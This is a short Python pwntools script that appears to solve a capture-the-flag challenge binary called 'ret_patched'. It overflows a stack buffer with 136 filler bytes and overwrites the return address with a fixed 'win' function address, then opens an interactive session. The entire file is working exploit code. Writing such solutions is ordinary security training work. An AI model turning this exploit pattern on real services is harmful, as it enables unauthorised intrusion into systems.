#!/usr/bin/env python3

from pwn import *

exe = ELF("ret_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    # good luck pwning :)

    data = r.recvline()
    print(data)
    data = r.recvline()
    print(data)

    win_addr = p64(0x000000000040064a, endianness="little")
    r.sendline(b"a"*136 + win_addr)

    r.interactive()


if __name__ == "__main__":
    main()
